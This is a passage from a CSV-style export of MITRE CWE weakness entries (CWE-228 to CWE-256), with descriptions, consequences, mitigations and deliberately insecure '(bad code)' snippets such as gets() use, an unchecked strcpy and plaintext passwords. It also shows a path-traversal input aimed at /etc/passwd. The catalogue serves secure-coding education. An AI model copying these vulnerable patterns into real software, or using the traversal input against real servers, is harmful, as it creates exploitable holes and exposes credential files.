(such as all 0's) or random data, before the transition to the next state.Effectiveness: HighPhases:  Architecture and Design; ImplementationWhen releasing, de-allocating, or deleting a resource, overwrite its data and relevant metadata with fixed patterns or random data. Be cautious about complex resource types whose underlying representation might be non-contiguous or change at a low level, such as how a file might be split into different chunks on a file system, even though ""logical"" file positions are contiguous at the application layer. Such resource types might require invocation of special modes or APIs to tell the underlying operating system to perform the necessary clearing, such as SDelete (Secure Delete) on Windows, although the appropriate functionality might not be available at the application layer.Effectiveness: High"
CWE CATEGORY: 7PK - API Abuse,"This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that involve the software using an API in a manner contrary to its intended use. According to the authors of the Seven Pernicious Kingdoms, ""An API is a contract between a caller and a callee. The most common forms of API misuse occurs when the caller does not honor its end of this contract. For example, if a program does not call chdir() after calling chroot(), it violates the contract that specifies how to change the active root directory in a secure fashion. Another good example of library abuse is expecting the callee to return trustworthy DNS information to the caller. In this case, the caller misuses the callee API by making certain assumptions about its behavior (that the return value can be used for authentication purposes). One can also violate the caller-callee contract from the other side. For example, if a coder subclasses SecureRandom and returns a non-random value, the contract is violated.""",无常见后果信息,无示范例子,无可能的缓解方案
CWE-228: Improper Handling of Syntactically Invalid Structure,The product does not handle or incorrectly handles input that is not syntactically well-formed with respect to the associated specification.,"Scope: IntegrityAvailability, Impact: Technical Impact:Unexpected State; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU)If an input is syntactically invalid, then processing the input could place the system in an unexpected state that could lead to a crash, consume available system resources or other unintended behaviors., Likelihood: ","Example 1This Android application has registered to handle a URL when sent an intent:(bad code)Example Language:Java...IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);...public class UrlHandlerReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {String URL = intent.getStringExtra(""URLToOpen"");int length = URL.length();...}}}The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.",无可能的缓解方案
CWE-229: Improper Handling of Values,"The product does not properly handle when the expected number of values for parameters, fields, or arguments is not provided in input, or if those values are undefined.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE-230: Improper Handling of Missing Values,"The product does not handle or incorrectly handles when a parameter, field, or argument name is specified, but the associated value is missing, i.e. it is empty, blank, or null.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1This Android application has registered to handle a URL when sent an intent:(bad code)Example Language:Java...IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);...public class UrlHandlerReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {String URL = intent.getStringExtra(""URLToOpen"");int length = URL.length();...}}}The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.",无可能的缓解方案
CWE-231: Improper Handling of Extra Values,The product does not handle or incorrectly handles when more values are provided than expected.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE-232: Improper Handling of Undefined Values,"The product does not handle or incorrectly handles when a value is not defined or supported for the associated parameter, field, or argument name.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1In this example, an address parameter is read and trimmed of whitespace.(bad code)Example Language:JavaString address = request.getParameter(""address"");address = address.trim();String updateString = ""UPDATE shippingInfo SET address='?' WHERE email='cwe@example.com'"";emailAddress = con.prepareStatement(updateString);emailAddress.setString(1, address);If the value of the address parameter is null (undefined), the servlet will throw a NullPointerException when the trim() is attempted.",无可能的缓解方案
CWE-233: Improper Handling of Parameters,"The product does not properly handle when the expected number of parameters, fields, or arguments is not provided in input, or if those parameters are undefined.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1This Android application has registered to handle a URL when sent an intent:(bad code)Example Language:Java...IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);...public class UrlHandlerReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {String URL = intent.getStringExtra(""URLToOpen"");int length = URL.length();...}}}The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.",无可能的缓解方案
CWE-234: Failure to Handle Missing Parameter,"If too few arguments are sent to a function, the function will still pop the expected number of arguments from the stack. Potentially, a variable number of arguments could be exhausted in a function as well.","Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Gain Privileges or Assume IdentityThere is the potential for arbitrary code execution with privileges of the vulnerable program if function parameter list is exhausted., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartPotentially a program could fail if it needs more arguments then are available., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Cfoo_funct(one, two);void foo_funct(int one, int two, int three) {printf(""1) %d\n2) %d\n3) %d\n"", one, two, three);}(bad code)Example Language:Cvoid some_function(int foo, ...) {int a[3], i;va_list ap;va_start(ap, foo);for (i = 0; i < sizeof(a) / sizeof(int); i++) a[i] = va_arg(ap, int);va_end(ap);}int main(int argc, char *argv[]) {some_function(17, 42);}This can be exploited to disclose information with no work whatsoever. In fact, each time this function is run, it will print out the next 4 bytes on the stack after the two numbers sent to it.",Phase:  Build and CompilationThis issue can be simply combated with the use of proper build process.Phase:  ImplementationForward declare all functions. This is the recommended solution. Properly forward declaration of all used functions will result in a compiler error if too few arguments are sent to a function.
CWE-235: Improper Handling of Extra Parameters,"The product does not handle or incorrectly handles when the number of parameters, fields, or arguments with the same name exceeds the expected amount.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE-236: Improper Handling of Undefined Parameters,"The product does not handle or incorrectly handles when a particular parameter, field, or argument name is not defined or supported by the product.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE-237: Improper Handling of Structural Elements,The product does not handle or incorrectly handles inputs that are related to complex structures.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE-238: Improper Handling of Incomplete Structural Elements,The product does not handle or incorrectly handles when a particular structural element is not completely specified.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE-239: Failure to Handle Incomplete Element,The product does not properly handle when a particular element is not completely specified.,"Scope: IntegrityOther, Impact: Technical Impact:Varies by Context; Unexpected State, Likelihood: ",无示范例子,无可能的缓解方案
CWE-240: Improper Handling of Inconsistent Structural Elements,"The product does not handle or incorrectly handles when two or more structural elements should be consistent, but are not.","Scope: IntegrityOther, Impact: Technical Impact:Varies by Context; Unexpected State, Likelihood: ","Example 1In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing.(bad code)Example Language:Cint processMessageFromSocket(int socket) {int success;char buffer[BUFFER_SIZE];char message[MESSAGE_SIZE];// get message from socket and store into buffer//Ignoring possibliity that buffer > BUFFER_SIZEif (getMessage(socket, buffer, BUFFER_SIZE) > 0) {// place contents of the buffer into message structureExMessage *msg = recastBuffer(buffer);// copy message body into string for processingint index;for (index = 0; index < msg->msgLength; index++) {message[index] = msg->msgBody[index];}message[index] = '\0';// process messagesuccess = processMessage(message);}return success;}However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body (CWE-606). This can result in a buffer over-read (CWE-125) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body (CWE-130).",无可能的缓解方案
CWE-241: Improper Handling of Unexpected Data Type,"The product does not handle or incorrectly handles when a particular element is not the expected type, e.g. it expects a digit (0-9) but is provided with a letter (A-Z).","Scope: IntegrityOther, Impact: Technical Impact:Varies by Context; Unexpected State, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-242: Use of Inherently Dangerous Function,The product calls a function that can never be guaranteed to work safely.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1The code below calls gets() to read information into a buffer.(bad code)Example Language:Cchar buf[BUFSIZE];gets(buf);The gets() function in C is inherently unsafe.Example 2The code below calls the gets() function to read in data from the command line.(bad code)Example Language:Cchar buf[24];printf(""Please enter your name and press <Enter>\n"");gets(buf);...}However, gets() is inherently unsafe, because it copies all input from STDIN to the buffer without checking size. This allows the user to provide a string that is larger than the buffer size, resulting in an overflow condition.",Phases:  Implementation; RequirementsBan the use of dangerous functions. Use their safe equivalent.Phase:  TestingUse grep or static analysis tools to spot usage of dangerous functions.
CWE-243: Creation of chroot Jail Without Changing Working Directory,"The product uses the chroot() system call to create a jail, but does not change the working directory afterward. This does not prevent access to files outside of the jail.","Scope: Confidentiality, Impact: Technical Impact:Read Files or Directories, Likelihood: ","Example 1Consider the following source code from a (hypothetical) FTP server:(bad code)Example Language:Cchroot(""/var/ftproot"");...fgets(filename, sizeof(filename), network);localfile = fopen(filename, ""r"");while ((len = fread(buf, 1, sizeof(buf), localfile)) != EOF) {fwrite(buf, 1, sizeof(buf), network);}fclose(localfile);This code is responsible for reading a filename from the network, opening the corresponding file on the local machine, and sending the contents over the network. This code could be used to implement the FTP GET command. The FTP server calls chroot() in its initialization routines in an attempt to prevent access to files outside of /var/ftproot. But because the server does not change the current working directory by calling chdir(""/""), an attacker could request the file ""../../../../../etc/passwd"" and obtain a copy of the system password file.",无可能的缓解方案
CWE-244: Improper Clearing of Heap Memory Before Release ('Heap Inspection'),"Using realloc() to resize buffers that store sensitive information can leave the sensitive information exposed to attack, because it is not removed from memory.","Scope: ConfidentialityOther, Impact: Technical Impact:Read Memory; OtherBe careful using vfork() and fork() in security sensitive code. The process state will not be cleaned up and will contain traces of data from past use., Likelihood: ","Example 1The following code calls realloc() on a buffer containing sensitive data:(bad code)Example Language:Ccleartext_buffer = get_secret();...cleartext_buffer = realloc(cleartext_buffer, 1024);...scrub_memory(cleartext_buffer, 1024);There is an attempt to scrub the sensitive data from memory, but realloc() is used, so it could return a pointer to a different part of memory. The memory that was originally allocated for cleartext_buffer could still contain an uncleared copy of the data.",无可能的缓解方案
CWE-245: J2EE Bad Practices: Direct Management of Connections,"The J2EE application directly manages connections, instead of using the container's connection management facilities.","Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1In the following example, the class DatabaseConnection opens and manages a connection to a database for a J2EE application. The method openDatabaseConnection opens a connection to the database using a DriverManager to create the Connection object conn to the database specified in the string constant CONNECT_STRING.(bad code)Example Language:Javapublic class DatabaseConnection {private static final String CONNECT_STRING = ""jdbc:mysql://localhost:3306/mysqldb"";private Connection conn = null;public DatabaseConnection() {}public void openDatabaseConnection() {try {conn = DriverManager.getConnection(CONNECT_STRING);} catch (SQLException ex) {...}}// Member functions for retrieving database connection and accessing database...}The use of the DriverManager class to directly manage the connection to the database violates the J2EE restriction against the direct management of connections. The J2EE application should use the web application container's resource management facilities to obtain a connection to the database as shown in the following example.(good code)public class DatabaseConnection {private static final String DB_DATASRC_REF = ""jdbc:mysql://localhost:3306/mysqldb"";private Connection conn = null;public DatabaseConnection() {}public void openDatabaseConnection() {try {InitialContext ctx = new InitialContext();DataSource datasource = (DataSource) ctx.lookup(DB_DATASRC_REF);conn = datasource.getConnection();} catch (NamingException ex) {...}} catch (SQLException ex) {...}}// Member functions for retrieving database connection and accessing database...}",无可能的缓解方案
CWE-246: J2EE Bad Practices: Direct Use of Sockets,The J2EE application directly uses sockets instead of using framework method calls.,"Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1The following example opens a socket to connect to a remote server.(bad code)Example Language:Javapublic void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {// Perform servlet tasks....// Open a socket to a remote server (bad).Socket sock = null;try {sock = new Socket(remoteHostname, 3000);// Do something with the socket....} catch (Exception e) {...}}A Socket object is created directly within the Java servlet, which is a dangerous way to manage remote connections.",Phase:  Architecture and DesignUse framework method calls instead of using sockets directly.
CWE-247: DEPRECATED: Reliance on DNS Lookups in a Security Decision,This entry has been deprecated because it was a duplicate ofCWE-350. All content has been transferred toCWE-350.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-248: Uncaught Exception,"An exception is thrown from a function, but it is not caught.","Scope: AvailabilityConfidentiality, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Read Application DataAn uncaught exception could cause the system to be placed in a state that could lead to a crash, exposure of sensitive information or other unintended behaviors., Likelihood: ","Example 1The following example attempts to resolve a hostname.(bad code)Example Language:Javaprotected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {String ip = req.getRemoteAddr();InetAddress addr = InetAddress.getByName(ip);...out.println(""hello "" + addr.getHostName());}A DNS lookup failure will cause the Servlet to throw an exception.Example 2The _alloca() function allocates memory on the stack. If an allocation request is too large for the available stack space, _alloca() throws an exception. If the exception is not caught, the program will crash, potentially enabling a denial of service attack. _alloca() has been deprecated as of Microsoft Visual Studio 2005(R). It has been replaced with the more secure _alloca_s().Example 3EnterCriticalSection() can raise an exception, potentially causing the program to crash. Under operating systems prior to Windows 2000, the EnterCriticalSection() function can raise an exception in low memory situations. If the exception is not caught, the program will crash, potentially enabling a denial of service attack.",无可能的缓解方案
CWE-249: DEPRECATED: Often Misused: Path Manipulation,This entry has been deprecated because of name confusion and an accidental combination of multiple weaknesses. Most of its content has been transferred toCWE-785.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-250: Execution with Unnecessary Privileges,"The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.","Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Execute Unauthorized Code or Commands; Read Application Data; DoS: Crash, Exit, or RestartAn attacker will be able to gain access to any resources that are allowed by the extra privileges. Common results include executing code, disabling services, and reading restricted data., Likelihood: ","Example 1This code temporarily raises the program's privileges to allow creation of a new user folder.(bad code)Example Language:Pythondef makeNewUserDir(username):if invalidUsername(username):#avoidCWE-22andCWE-78print('Usernames cannot contain invalid characters')return Falsetry:raisePrivileges()os.mkdir('/home/' + username)lowerPrivileges()except OSError:print('Unable to create new user directory for user:' + username)return Falsereturn TrueWhile the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.Example 2The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file.(bad code)Example Language:Cchroot(APP_HOME);chdir(""/"");FILE* data = fopen(argv[1], ""r+"");...Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced.Example 3This application intends to use a user's location to determine the timezone the user is in:(bad code)Example Language:JavalocationClient = new LocationClient(this, this, this);locationClient.connect();Location userCurrLocation;userCurrLocation = locationClient.getLastLocation();setTimeZone(userCurrLocation);This is unnecessary use of the location API, as this information is already available using the Android Time API. Always be sure there is not another way to obtain needed information before resorting to using the location API.Example 4This code uses location to determine the user's current US State location.First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:(bad code)Example Language:XML<uses-permission android:name=""android.permission.ACCESS_FINE_LOCATION""/>During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:(bad code)Example Language:JavalocationClient = new LocationClient(this, this, this);locationClient.connect();Location userCurrLocation;userCurrLocation = locationClient.getLastLocation();deriveStateFromCoords(userCurrLocation);While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in.","Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeIdentify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoidCWE-271. Avoid weaknesses such asCWE-288andCWE-420by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators.Phase:  Architecture and DesignStrategy:  Attack Surface ReductionIdentify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoidCWE-271. Avoid weaknesses such asCWE-288andCWE-420by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators.Phase:  ImplementationPerform extensive input validation for any privileged code that must be exposed to the user and reject anything that does not fit your strict requirements.Phase:  ImplementationWhen dropping privileges, ensure that they have been dropped successfully to avoidCWE-273. As protection mechanisms in the environment get stronger, privilege-dropping calls may fail even if it seems like they would always succeed.Phase:  ImplementationIf circumstances force you to run with extra privileges, then determine the minimum access level necessary. First identify the different permissions that the software and its users will need to perform their actions, such as file read and write permissions, network socket permissions, and so forth. Then explicitly allow those actions while denying all else [REF-76]. Perform extensive input validation and canonicalization to minimize the chances of introducing a separate vulnerability. This mitigation is much more prone to error than dropping the privileges in the first place.Phases:  Operation; System ConfigurationStrategy:  Environment HardeningEnsure that the software runs properly under the United States Government Configuration Baseline (USGCB) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software."
CWE CATEGORY: Often Misused: String Management,Functions that manipulate strings encourage buffer overflows.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-252: Unchecked Return Value,"The product does not check the return value from a method or function, which can prevent it from detecting unexpected states and conditions.","Scope: AvailabilityIntegrity, Impact: Technical Impact:Unexpected State; DoS: Crash, Exit, or RestartAn unexpected return value could place the system in a state that could lead to a crash or other unintended behaviors., Likelihood: ","Example 1Consider the following code segment:(bad code)Example Language:Cchar buf[10], cp_buf[10];fgets(buf, 10, stdin);strcpy(cp_buf, buf);The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy().Example 2In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed:(bad code)Example Language:Cint returnChunkSize(void *) {/* if chunk info is valid, return the size of usable memory,* else, return -1 to indicate an error*/...}int main() {...memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));...}If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787,CWE-788).Example 3The following code does not check to see if memory allocation succeeded before attempting to use the pointer returned by malloc().(bad code)Example Language:Cbuf = (char*) malloc(req_size);strncpy(buf, xfer, req_size);The traditional defense of this coding error is: ""If my program runs out of memory, it will fail. It doesn't matter whether I handle the error or allow the program to die with a segmentation fault when it tries to dereference the null pointer."" This argument ignores three important considerations:Depending upon the type and size of the application, it may be possible to free memory that is being used elsewhere so that execution can continue.It is impossible for the program to perform a graceful exit if required. If the program is performing an atomic operation, it can leave the system in an inconsistent state.The programmer has lost the opportunity to record diagnostic information. Did the call to malloc() fail because req_size was too large or because there were too many requests being handled at the same time? Or was it caused by a memory leak that has built up over time? Without handling the error, there is no way to know.Example 4The following examples read a file into a byte array.(bad code)Example Language:C#char[] byteArray = new char[1024];for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) {String userName = (String) i.Current();String pFileName = PFILE_ROOT + ""/"" + userName;StreamReader sr = new StreamReader(pFileName);sr.Read(byteArray,0,1024);//the file is always 1k bytessr.Close();processPFile(userName, byteArray);}(bad code)Example Language:JavaFileInputStream fis;byte[] byteArray = new byte[1024];for (Iterator i=users.iterator(); i.hasNext();) {String userName = (String) i.next();String pFileName = PFILE_ROOT + ""/"" + userName;FileInputStream fis = new FileInputStream(pFileName);fis.read(byteArray); // the file is always 1k bytesfis.close();processPFile(userName, byteArray);The code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always 1 kilobyte in size and therefore ignores the return value from Read(). If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and treat it as though it belongs to the attacker.Example 5The following code does not check to see if the string returned by getParameter() is null before calling the member function compareTo(), potentially causing a NULL dereference.(bad code)Example Language:JavaString itemName = request.getParameter(ITEM_NAME);if (itemName.compareTo(IMPORTANT_ITEM) == 0) {...}...The following code does not check to see if the string returned by the Item property is null before calling the member function Equals(), potentially causing a NULL dereference.(bad code)Example Language:JavaString itemName = request.Item(ITEM_NAME);if (itemName.Equals(IMPORTANT_ITEM)) {...}...The traditional defense of this coding error is: ""I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or allow the program to die dereferencing a null value."" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.Example 6The following code shows a system property that is set to null and later dereferenced by a programmer who mistakenly assumes it will always be defined.(bad code)Example Language:JavaSystem.clearProperty(""os.name"");...String os = System.getProperty(""os.name"");if (os.equalsIgnoreCase(""Windows 95"")) System.out.println(""Not supported"");The traditional defense of this coding error is: ""I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or allow the program to die dereferencing a null value."" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.Example 7The following VB.NET code does not check to make sure that it has read 50 bytes from myfile.txt. This can cause DoDangerousOperation() to operate on an unexpected value.(bad code)Example Language:C#Dim MyFile As New FileStream(""myfile.txt"", FileMode.Open, FileAccess.Read, FileShare.Read)Dim MyArray(50) As ByteMyFile.Read(MyArray, 0, 50)DoDangerousOperation(MyArray(20))In .NET, it is not uncommon for programmers to misunderstand Read() and related methods that are part of many System.IO classes. The stream and reader classes do not consider it to be unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested.Example 8It is not uncommon for Java programmers to misunderstand read() and related methods that are part of many java.io classes. Most errors and unusual events in Java result in an exception being thrown. But the stream and reader classes do not consider it unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested. This behavior makes it important for programmers to examine the return value from read() and other IO methods to ensure that they receive the amount of data they expect.Example 9This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.(bad code)Example Language:Cvoid host_lookup(char *user_supplied_addr){struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);/*routine that ensures user_supplied_addr is in the right format for conversion */validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);}If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy().Note that this code is also vulnerable to a buffer overflow (CWE-119).Example 10The following function attempts to acquire a lock in order to perform operations on a shared resource.(bad code)Example Language:Cvoid f(pthread_mutex_t *mutex) {pthread_mutex_lock(mutex);/* access shared resource */pthread_mutex_unlock(mutex);}However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior.In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels.(good code)Example Language:Cint f(pthread_mutex_t *mutex) {int result;result = pthread_mutex_lock(mutex);if (0 != result)return result;/* access shared resource */return pthread_mutex_unlock(mutex);}","Phase:  ImplementationCheck the results of all functions that return a value and verify that the value is expected.Effectiveness: HighNote:Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment.Phase:  ImplementationEnsure that you account for all possible return values from the function.Phase:  ImplementationWhen designing a function, make sure you return a value or throw an exception in case of an error."
CWE-253: Incorrect Check of Function Return Value,"The product incorrectly checks a return value from a function, which prevents it from detecting errors or exceptional conditions.","Scope: AvailabilityIntegrity, Impact: Technical Impact:Unexpected State; DoS: Crash, Exit, or RestartAn unexpected return value could place the system in a state that could lead to a crash or other unintended behaviors., Likelihood: ","Example 1This code attempts to allocate memory for 4 integers and checks if the allocation succeeds.(bad code)Example Language:Ctmp = malloc(sizeof(int) * 4);if (tmp < 0 ) {perror(""Failure"");//should have checked if the call returned 0}The code assumes that only a negative return value would indicate an error, but malloc() may return a null pointer when there is an error. The value of tmp could then be equal to 0, and the error would be missed.",Phase:  Architecture and DesignStrategy:  Language SelectionUse a language or compiler that uses exceptions and requires the catching of those exceptions.Phase:  ImplementationProperly check all functions which return a value.Phase:  ImplementationWhen designing any function make sure you return a value or throw an exception in case of an error.
CWE CATEGORY: 7PK - Security Features,"Software security is not security software. Here we're concerned with topics like authentication, access control, confidentiality, cryptography, and privilege management.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Credentials Management Errors,Weaknesses in this category are related to the management of credentials.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-256: Plaintext Storage of a Password,Storing a password in plaintext may result in a system compromise.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ","Example 1The following code reads a password from a properties file and uses the password to connect to a database.(bad code)Example Language:Java...Properties prop = new Properties();prop.load(new FileInputStream(""config.properties""));String password = prop.getProperty(""password"");DriverManager.getConnection(url, usr, password);...This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system.Example 2The following code reads a password from the registry and uses the password to create a new network credential.(bad code)Example Language:Java...String password = regKey.GetValue(passKey).toString();NetworkCredential netCred = new NetworkCredential(username,password,domain);...This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the systemExample 3The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.This Java example shows a properties file with a cleartext username / password pair.(bad code)Example Language:Java# Java Web App ResourceBundle properties file...webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.Example 4In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.At least one OT product stored a password in plaintext.","Phase:  Architecture and DesignAvoid storing passwords in easily accessible locations.Phase:  Architecture and DesignConsider storing cryptographic hashes of passwords as an alternative to storing in plaintext.A programmer might attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password because the encoding can be detected and decoded easily.Effectiveness: None"
